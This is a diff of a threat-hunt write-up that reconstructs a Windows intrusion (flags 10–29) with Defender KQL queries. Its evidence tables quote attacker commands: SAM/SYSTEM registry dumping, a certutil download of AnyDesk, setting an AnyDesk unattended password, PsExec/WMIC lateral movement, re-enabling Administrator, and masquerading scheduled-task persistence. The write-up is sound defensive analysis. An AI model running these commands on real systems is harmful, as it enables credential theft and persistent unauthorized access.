@@ -1,4 +1,4 @@
-# Threat-Hunt-The-Broker
+# Threat Hunt "The Broker"
 
 <p align="center">
   <img
@@ -121,15 +121,12 @@ All findings were derived from Defender Advanced Hunting telemetry without relia
 
 ## 📚 Table of Contents
 
-- [🧠 Hunt Overview](#-hunt-overview)
-- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
-- [🔥 Executive MITRE ATT&CK Heatmap](#-executive-mitre-attck-heatmap)
-- [📊 Executive Takeaway](#-executive-takeaway)
-- [🔍 Flag Analysis](#-flag-analysis)
-- [🚨 Detection Opportunities](#-detection-opportunities)
-- [🛡️ Defensive Takeaways](#️-defensive-takeaways)
-- [🧾 Final Assessment](#-final-assessment)
-- [📎 Analyst Notes](#-analyst-notes)
+- [🧠 Hunt Overview](#hunt-overview)
+- [🧬 MITRE ATT&CK Summary](#mitre-attck-summary)
+- [🔥 Executive MITRE ATT&CK Heatmap](#executive-mitre-attck-heatmap)
+- [📊 Executive Takeaway](#executive-takeaway)
+- [🔍 Flag Analysis](#flag-analysis)
+- [🚨 Detection Gaps & Recommendations](#detection-gaps--recommendations)
 
 ---
 
@@ -697,6 +694,1656 @@ DeviceProcessEvents
 ```
 
 </details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 10: Local Staging Directory (Credential Dump Location)</strong></summary>
+
+### 🎯 Objective  
+Identify where the attacker locally staged credential dumps prior to exfiltration.
+
+---
+
+### 📌 Finding  
+Following registry hive dumping activity, process telemetry revealed that extracted credential artifacts were written directly to disk. Command-line parsing of **reg.exe save** operations exposed the local staging path used by the attacker.
+
+Credential dumps were staged in a publicly writable directory commonly abused during intrusions:
+**C:\Users\Public**
+
+This location provides:
+- Broad write permissions  
+- Low visibility compared to protected directories  
+- Easy access for follow-on compression or transfer
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:13:32.7652183Z |
+| Host | as-pc1 |
+| Tool | reg.exe |
+| Command | `"reg.exe" save HKLM\SAM C:\Users\Public\sam.hiv` |
+| Output Path | `C:\Users\Public\sam.hiv` |
+| Staging Directory | `C:\Users\Public` |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where FileName =~ "reg.exe"
+| where ProcessCommandLine has " save "
+| extend OutFile = extract(@"(?i)\bsave\s+[^\s]+\s+([A-Za-z]:\\[^\s]+)", 1, ProcessCommandLine)
+| project Timestamp, DeviceName, OutFile, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 11: Execution Identity (Credential Dump User Context)</strong></summary>
+
+### 🎯 Objective  
+Identify the user context under which credential dumping activity was executed.
+
+---
+
+### 📌 Finding  
+After confirming registry hive dumping and local staging, process attribution fields were analyzed to determine the executing identity. Endpoint telemetry tied to **reg.exe save** operations revealed the account responsible for performing credential extraction.
+
+The activity was executed under the compromised user:
+**sophie.turner**
+
+This confirms credential harvesting occurred within a legitimate user security context, indicating account compromise or token abuse.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:13:32.840061Z |
+| Host | as-pc1 |
+| Tool | reg.exe |
+| AccountName | sophie.turner |
+| InitiatingProcessAccountName | sophie.turner |
+| Command | `"reg.exe" save HKLM\SYSTEM C:\Users\Public\system.hiv` |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where FileName =~ "reg.exe"
+| where ProcessCommandLine has " save "
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         InitiatingProcessAccountName,
+         ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 12: Identity Verification (Post-Exploitation Validation)</strong></summary>
+
+### 🎯 Objective  
+Identify how the attacker verified their execution identity after credential harvesting.
+
+---
+
+### 📌 Finding  
+Following credential dumping activity, process telemetry revealed execution of a native Windows identity verification utility. Attackers commonly validate their access level post-exploitation to confirm successful privilege use or token impersonation.
+
+Endpoint telemetry confirmed execution of:
+**whoami.exe**
+
+This indicates deliberate validation of the active security context before progressing further in the intrusion.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T03:58:55.6563735Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Process | whoami.exe |
+| Parent Process | daniel_richardson_cv.pdf.exe |
+| Parent Command | `"Daniel_Richardson_CV.pdf.exe"` |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where FileName =~ "whoami.exe"
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         ProcessCommandLine,
+         InitiatingProcessFileName,
+         InitiatingProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 13: Network Enumeration (Share Discovery)</strong></summary>
+
+### 🎯 Objective  
+Identify how the attacker enumerated accessible network shares during post-compromise discovery.
+
+---
+
+### 📌 Finding  
+Following credential harvesting and identity validation, process telemetry revealed execution of a native Windows networking utility commonly used during internal reconnaissance.
+
+Command-line artifacts confirmed execution of:
+**net.exe view**
+
+This command allows attackers to enumerate accessible network shares and neighboring systems, enabling identification of lateral movement targets and shared data repositories.
+
+The activity occurred during the active intrusion window and aligns with observed discovery-phase tradecraft.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:01:32.0791816Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Process | net.exe |
+| Command | net.exe view |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has_any ("net view", "net.exe view", "net share", "net use")
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         FileName,
+         ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 14: Local Admin Enumeration (Privileged Group Discovery)</strong></summary>
+
+### 🎯 Objective  
+Identify which privileged local group the attacker queried during post-compromise privilege discovery.
+
+---
+
+### 📌 Finding  
+Following network share enumeration, process telemetry revealed execution of a native Windows command used to enumerate local group membership. This behavior is commonly observed during privilege discovery as attackers assess available administrative access.
+
+Command-line artifacts confirmed execution of:
+**net.exe localgroup administrators**
+
+This indicates the attacker explicitly queried the local **Administrators** group to identify accounts with elevated privileges on the compromised host.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:01:19.1611938Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Process | net.exe |
+| Command | net.exe localgroup administrators |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has_any ("net localgroup", "net.exe localgroup")
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 15: Remote Access Tool (Persistence via Legitimate Software)</strong></summary>
+
+### 🎯 Objective  
+Identify the legitimate remote administration software used by the attacker to maintain persistent access.
+
+---
+
+### 📌 Finding  
+Following reconnaissance and privilege discovery, process telemetry revealed deployment of a legitimate remote access application across compromised systems. Attackers frequently abuse trusted administrative tools to establish stealthy persistence while blending into normal IT activity.
+
+Execution artifacts showed repeated launches of a known remote administration binary consistent with hands-on-keyboard persistence.
+
+Binary and command-line indicators identified the tool as:
+**AnyDesk**
+
+This software enables remote desktop control and is commonly abused by threat actors to maintain durable access with minimal detection.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:41:10.4250664Z |
+| Host | as-pc2 |
+| AccountName | david.mitchell |
+| FileName | AnyDesk.exe |
+| Command | "AnyDesk.exe" |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has_any ("anydesk", "teamviewer", "screenconnect", "vnc", "remote", "radmin")
+  or FileName has_any ("anydesk", "teamviewer", "screenconnect", "vnc", "radmin")
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         FileName,
+         ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 16: Remote Tool Hash (AnyDesk SHA256)</strong></summary>
+
+### 🎯 Objective  
+Identify the SHA256 file hash of the deployed remote access tool used for persistence.
+
+---
+
+### 📌 Finding  
+Following confirmation of AnyDesk deployment for persistence, process execution telemetry was analyzed to extract cryptographic hash metadata tied to the staged binary. Hash data was sourced directly from endpoint telemetry to preserve integrity without relying on external tooling.
+
+Telemetry revealed execution of:
+**AnyDesk.exe** staged in a public directory
+
+Process metadata exposed the associated SHA256 hash, uniquely identifying the binary used during the intrusion. This artifact enables high-confidence threat intelligence correlation and hash-based detection engineering.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:10:06.9484152Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| FileName | AnyDesk.exe |
+| Path | C:\Users\Public\AnyDesk.exe |
+| Command | AnyDesk.exe |
+| SHA256 | f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532 |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where FileName =~ "AnyDesk.exe"
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         FileName,
+         FolderPath,
+         ProcessCommandLine,
+         SHA256
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 17: Download Method (Native LOLBin Tool Transfer)</strong></summary>
+
+### 🎯 Objective  
+Identify the native Windows binary used to download the remote access tool.
+
+---
+
+### 📌 Finding  
+Following identification of the staged AnyDesk binary and its hash, process execution telemetry was analyzed to determine how the tool was retrieved. Command-line artifacts containing external URLs and staging paths revealed use of a native Windows utility for payload transfer.
+
+Telemetry confirmed HTTP-based retrieval of the AnyDesk binary followed by local staging in a public directory. The download activity was attributed to a built-in Windows binary commonly abused during intrusions.
+
+The LOLBin used for tool transfer was:
+**certutil.exe**
+
+This utility is frequently abused by attackers for ingress tool transfer due to its native availability and ability to download remote content.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:08:29.8398973Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Tool | certutil.exe |
+| Command | certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe |
+| Staging Path | C:\Users\Public\AnyDesk.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has "AnyDesk.exe"
+| where ProcessCommandLine has_any ("http", "https")
+| project Timestamp,
+         DeviceName,
+         AccountName,
+         FileName,
+         ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 18: Configuration Access (Remote Tool Configuration Artifact)</strong></summary>
+
+### 🎯 Objective  
+Identify the configuration file accessed after installation of the remote administration tool.
+
+---
+
+### 📌 Finding  
+Following deployment of AnyDesk for persistence, process execution telemetry was analyzed for post-installation validation behavior. Attackers commonly inspect configuration artifacts to confirm installation success and retrieve operational identifiers.
+
+Telemetry revealed command-line usage of native utilities to directly read a configuration file associated with the installed remote access software. The activity originated from the compromised user context and targeted the user’s roaming profile directory.
+
+The accessed configuration artifact was:
+**C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf**
+
+This file contains core AnyDesk configuration data and is frequently accessed by operators to confirm persistence and validate remote access readiness.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:11:13.5896114Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Tool | cmd.exe |
+| Command | cmd.exe /c "type C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf" |
+| Config Path | C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has "AnyDesk"
+| where ProcessCommandLine has_any ("type", ".conf", ".ini")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 19: Unattended Access Credential (Remote Persistence Password)</strong></summary>
+
+### 🎯 Objective  
+Identify the unattended access password configured for the deployed remote administration tool.
+
+---
+
+### 📌 Finding  
+Following confirmation of AnyDesk deployment and configuration access, process telemetry was analyzed for persistence hardening behavior. Attackers frequently configure unattended access credentials to enable remote re-entry without requiring user interaction.
+
+Command-line artifacts revealed use of the AnyDesk CLI with the `--set-password` argument. The password was passed directly through a command-line pipe, indicating deliberate unattended access configuration.
+
+Telemetry exposed the configured credential used for persistent remote access:
+**intrud3r!**
+
+This password enables repeated remote access without user approval, significantly strengthening attacker persistence.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:11:47.1679716Z |
+| Host | as-pc1 |
+| AccountName | sophie.turner |
+| Tool | cmd.exe |
+| Command | cmd.exe /c "echo intrud3r! \| C:\Users\Public\AnyDesk.exe --set-password" |
+| Technique | AnyDesk unattended access configuration |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where ProcessCommandLine has "--set-password"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 20: Deployment Footprint (Remote Tool Spread Across Environment)</strong></summary>
+
+### 🎯 Objective  
+Identify all hosts where the attacker deployed the remote administration tool to determine the persistence scope.
+
+---
+
+### 📌 Finding  
+After confirming installation, configuration, and credential persistence for AnyDesk, process telemetry was analyzed across the environment to determine the full deployment footprint. Aggregated execution activity associated with the AnyDesk binary revealed multiple systems exhibiting evidence of execution.
+
+Environment-wide telemetry confirmed the remote administration tool executed on multiple hosts, indicating successful lateral propagation and expanded persistence beyond the initial compromise.
+
+The affected systems identified were:
+- **as-pc1** — Initial staging and execution host  
+- **as-pc2** — Lateral deployment target  
+- **as-srv** — Additional host demonstrating expanded persistence scope
+
+This distribution confirms the attacker established durable access across multiple endpoints using legitimate remote administration tooling.
+
+---
+
+### 🔍 Evidence
+
+| DeviceName | ExecutionCount |
+|-----------|--------------|
+| as-srv | 16 |
+| as-pc1 | 16 |
+| as-pc2 | 15 |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where FileName =~ "AnyDesk.exe"
+| summarize ExecutionCount=count() by DeviceName
+| order by ExecutionCount desc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 21: Failed Execution Attempts (Unsuccessful Lateral Movement Tools)</strong></summary>
+
+### 🎯 Objective  
+Identify remote execution tools attempted by the attacker that failed prior to successful lateral movement.
+
+---
+
+### 📌 Finding  
+Following confirmation of lateral propagation, process telemetry was analyzed to identify early failed execution attempts. Attackers often test multiple remote execution methods before establishing reliable lateral movement.
+
+Process artifacts tied to the compromised account revealed multiple remote execution commands targeting additional hosts. Command-line analysis exposed trial usage of different remote execution utilities during the attacker’s experimentation phase.
+
+Two tools were observed during unsuccessful execution attempts:
+- **PsExec** — SMB-based remote service execution  
+- **WMIC** — WMI-based remote command invocation  
+
+While WMIC was later used successfully, early telemetry indicates both tools were tested during initial lateral movement attempts.
+
+This pattern reflects iterative attacker behavior commonly observed during hands-on-keyboard intrusions.
+
+---
+
+### 🔍 Evidence
+
+| Timestamp (UTC) | Device | Tool | Command Snippet |
+|----------------|--------|------|----------------|
+| 2026-01-15T04:23:20.0107844Z | as-pc1 | WMIC.exe | WMIC.exe /node:AS-PC2 process call create ... |
+| 2026-01-15T04:24:26.7361057Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 -u Administrator -p ********** cmd.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2","as-srv")
+| where AccountName =~ "sophie.turner" or InitiatingProcessAccountName =~ "sophie.turner"
+| extend Cmd = tostring(ProcessCommandLine)
+| where isnotempty(Cmd)
+| where Cmd has_any ("\\\\", "/node:", " /S ", " -ComputerName ", "Enter-PSSession", "Invoke-Command")
+| where Cmd has_any ("psexec", "wmic", "winrs", "schtasks", "at.exe", "sc.exe")
+| project Timestamp, DeviceName, AccountName, FileName, Cmd
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 22: Target Host (Failed Remote Execution Target)</strong></summary>
+
+### 🎯 Objective  
+Identify the hostname targeted during failed remote execution attempts.
+
+---
+
+### 📌 Finding  
+Following identification of failed lateral movement attempts, process telemetry was analyzed to determine the intended remote target. Attackers often repeatedly target the same host while refining execution techniques.
+
+Command-line artifacts tied to the compromised account revealed multiple remote execution attempts using both PsExec and WMIC. Extraction of remote host indicators from UNC paths and `/node:` parameters showed a consistent lateral movement target.
+
+All failed execution attempts referenced:
+**AS-PC2**
+
+The hostname appeared repeatedly across multiple command invocations, confirming it as the primary early-stage lateral movement target.
+
+---
+
+### 🔍 Evidence
+
+| Timestamp (UTC) | Source Host | Tool | Command Snippet |
+|----------------|------------|------|----------------|
+| 2026-01-15T04:23:20Z | as-pc1 | WMIC.exe | WMIC.exe /node:AS-PC2 process call create ... |
+| 2026-01-15T04:24:26Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 -u Administrator ... |
+| 2026-01-15T04:25:42Z | as-pc1 | PsExec.exe | PsExec.exe \\AS-PC2 cmd.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where AccountName =~ "sophie.turner"
+| where ProcessCommandLine has_any ("psexec", "/node:")
+| extend TargetHost = extract(@"\\\\([A-Za-z0-9\-]+)|/node:([A-Za-z0-9\-]+)", 1, ProcessCommandLine)
+| project Timestamp, DeviceName, ProcessCommandLine, TargetHost
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 23: Successful Pivot (Alternate Lateral Movement Method)</strong></summary>
+
+### 🎯 Objective  
+Identify the Windows executable used to achieve lateral movement after earlier remote execution attempts failed.
+
+---
+
+### 📌 Finding  
+Following failed remote execution attempts using PsExec and WMIC, network telemetry was analyzed for alternate lateral movement techniques. Attackers commonly pivot to interactive access when automated tooling proves unreliable.
+
+Outbound connections over TCP port 3389 were observed during the attack window, indicating Remote Desktop Protocol (RDP) activity. Correlation with initiating process metadata revealed the native Windows executable responsible for establishing the session.
+
+The successful pivot was performed using:
+**mstsc.exe**
+
+This binary is the native Windows Remote Desktop client and confirms the attacker transitioned to manual interactive lateral movement.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:29:45.3012715Z |
+| Source Host | as-pc1 |
+| Account | sophie.turner |
+| Process | mstsc.exe |
+| Remote IP | 10.1.0.183 |
+| Remote Port | 3389 |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceNetworkEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2","as-srv")
+| where RemotePort == 3389
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 24: Movement Path (Lateral Movement Sequence Reconstruction)</strong></summary>
+
+### 🎯 Objective  
+Reconstruct the full lateral movement path by determining the order in which the attacker moved between hosts.
+
+---
+
+### 📌 Finding  
+To reconstruct attacker movement across the environment, telemetry associated with the deployed persistence tool (AnyDesk.exe) was aggregated. The first observed appearance of the tool on each host was used as a reliable marker for lateral movement progression.
+
+By correlating file creation and process execution events, the earliest evidence of tool presence was identified per host and ordered chronologically.
+
+The reconstructed movement sequence was:
+- **as-pc1** — Initial foothold and staging location  
+- **as-pc2** — First lateral movement target  
+- **as-srv** — Expanded persistence scope  
+
+This timeline reflects staged lateral movement from the initial workstation to additional endpoints and ultimately server infrastructure.
+
+---
+
+### 🔍 Evidence
+
+| Host | First Seen (UTC) | Evidence Types |
+|------|-----------------|--------------|
+| as-pc1 | 2026-01-15T04:08:32.3138216Z | FileEvent, ProcessEvent |
+| as-pc2 | 2026-01-15T04:40:58.7958316Z | FileEvent, ProcessEvent |
+| as-srv | 2026-01-15T04:57:07.3241004Z | FileEvent, ProcessEvent |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+let tool = "AnyDesk.exe";
+union
+(
+ DeviceFileEvents
+ | where Timestamp between (start .. end)
+ | where FileName =~ tool
+ | project Timestamp, DeviceName, Evidence="FileEvent", Detail=strcat(ActionType, " ", FolderPath)
+),
+(
+ DeviceProcessEvents
+ | where Timestamp between (start .. end)
+ | where FileName =~ tool
+ | project Timestamp, DeviceName, Evidence="ProcessEvent", Detail=ProcessCommandLine
+)
+| summarize FirstSeen=min(Timestamp), EvidenceSeen=make_set(Evidence, 10) by DeviceName
+| order by FirstSeen asc
+| project DeviceName, FirstSeen, EvidenceSeen
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 25: Compromised Account (Successful Lateral Authentication)</strong></summary>
+
+### 🎯 Objective  
+Identify the valid account used for successful authentication during lateral movement.
+
+---
+
+### 📌 Finding  
+Following reconstruction of the attacker’s movement path, authentication telemetry was analyzed to determine which identity successfully authenticated across pivot hosts. Logon telemetry from lateral targets revealed the earliest authenticated identity appearing after the attacker transitioned from the initially compromised workstation.
+
+The earliest confirmed successful authentication on a pivot host was performed by:
+**david.mitchell**
+
+This account appeared on a lateral movement target following the initial compromise, indicating credential reuse during attacker propagation.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| AccountName | david.mitchell |
+| Host | as-srv |
+| First Seen (UTC) | 2026-01-15T02:00:13.9683262Z |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceLogonEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc2","as-srv")
+| summarize FirstSeen=min(Timestamp) by AccountName, DeviceName
+| order by FirstSeen asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 26: Account Activation (Disabled Account Re-Enablement)</strong></summary>
+
+### 🎯 Objective  
+Identify the parameter used to activate a previously disabled account.
+
+---
+
+### 📌 Finding  
+Following credential abuse and lateral movement activity, process telemetry was analyzed for account lifecycle manipulation behaviors. Attackers commonly re-enable dormant accounts to establish persistence while blending into legitimate administrative workflows.
+
+Process execution artifacts revealed use of the Windows account management utility **net.exe** with command-line arguments indicative of account activation. Inspection of execution parameters confirmed the attacker re-enabled a disabled account using a native account control flag.
+
+The parameter observed was:
+**/active:yes**
+
+This flag is used with the `net user` command to activate disabled accounts, enabling authentication and long-term persistence.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:40:31.9488698Z |
+| Host | as-pc2 |
+| AccountName | david.mitchell |
+| Tool | net.exe |
+| Command | "net.exe" user Administrator /active:yes |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where FileName =~ "net.exe"
+| where ProcessCommandLine has "active"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 27: Activation Context (User Responsible for Account Activation)</strong></summary>
+
+### 🎯 Objective  
+Identify the user responsible for activating the disabled account.
+
+---
+
+### 📌 Finding  
+Following confirmation that a disabled account was re-enabled using the `/active:yes` parameter, process telemetry was analyzed to determine the execution context of the activation. Identifying the executing user provides attribution for account manipulation activity.
+
+Execution metadata tied to the `net.exe` activation command revealed the user responsible for performing the action. The process context clearly showed the activation was executed under a valid compromised identity.
+
+The account responsible for the activation was:
+**david.mitchell**
+
+This confirms the attacker used an already compromised account to modify account states and strengthen persistence.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:40:31.9488698Z |
+| Host | as-pc2 |
+| Executing User | david.mitchell |
+| Tool | net.exe |
+| Command | "net.exe" user Administrator /active:yes |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where FileName =~ "net.exe"
+| where ProcessCommandLine has "active"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 28: Scheduled Persistence (Noise-Reduced Detection)</strong></summary>
+
+### 🎯 Objective  
+Identify the attacker-created scheduled task used for persistence while filtering environmental noise.
+
+---
+
+### 📌 Finding  
+Following identification of multiple persistence mechanisms, process telemetry was analyzed for scheduled task creation activity. Because scheduled task telemetry can be noisy due to legitimate scanning and administrative tooling, filtering focused on high-confidence attacker indicators such as:
+
+- Task creation activity (`/create`)
+- Execution from attacker staging paths (`C:\Users\Public`)
+- Elevated run level (`/rl highest`)
+- Explicit payload execution (`/tr`)
+
+After reducing environmental noise, a recurring scheduled task was identified across compromised hosts.
+
+The malicious task name was:
+**MicrosoftEdgeUpdateCheck**
+
+Key indicators of malicious persistence:
+- Masquerading as a legitimate Microsoft update task  
+- Executing payload from a public staging directory  
+- Configured for elevated execution  
+- Observed across multiple compromised systems
+
+This behavior strongly indicates deliberate persistence establishment using scheduled task masquerading.
+
+---
+
+### 🔍 Evidence
+
+| Timestamp (UTC) | Host | Account | Task Name | Payload |
+|----------------|------|--------|----------|--------|
+| 2026-01-15T04:52:32.6871861Z | as-pc2 | david.mitchell | MicrosoftEdgeUpdateCheck | C:\Users\Public\RuntimeBroker.exe |
+| 2026-01-15T04:56:59.3404574Z | as-srv | as.srv.administrator | MicrosoftEdgeUpdateCheck | C:\Users\Public\RuntimeBroker.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2","as-srv")
+| where FileName =~ "schtasks.exe"
+| where ProcessCommandLine has "/create"
+| where ProcessCommandLine has_any (@"C:\Users\Public\", "/rl highest", "/tr")
+| extend TaskName = extract(@"(?i)/tn\s+(""[^""]+""|\S+)", 1, ProcessCommandLine)
+| extend TaskRun  = extract(@"(?i)/tr\s+(""[^""]+""|\S+)", 1, ProcessCommandLine)
+| project Timestamp, DeviceName, AccountName, TaskName, TaskRun, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 29: Renamed Binary (Masqueraded Persistence Payload)</strong></summary>
+
+### 🎯 Objective  
+Identify the filename used for the renamed persistence payload deployed by the attacker.
+
+---
+
+### 📌 Finding  
+Following discovery of scheduled task persistence, analysis pivoted to identifying the underlying payload executed by the task. Since attackers frequently rename binaries to evade detection, process telemetry was reviewed for payload staging activity in suspicious directories.
+
+Execution artifacts revealed download and staging of a payload into a public directory using a renamed filename. Command-line telemetry showed the attacker downloading a payload from external infrastructure and writing it to disk under a different name.
+
+The renamed payload path observed in telemetry:
+**C:\Users\Public\RuntimeBroker.exe**
+
+Although RuntimeBroker.exe is a legitimate Windows binary name, it normally resides in the System32 directory. Its presence in a public staging directory strongly indicates masquerading.
+
+This demonstrates deliberate evasion by renaming a malicious payload to resemble a trusted Windows process.
+
+---
+
+### 🔍 Evidence
+
+| Timestamp (UTC) | Host | Account | Artifact |
+|----------------|------|--------|---------|
+| 2026-01-15T04:52:22.9618142Z | as-pc2 | david.mitchell | certutil download staging RuntimeBroker.exe |
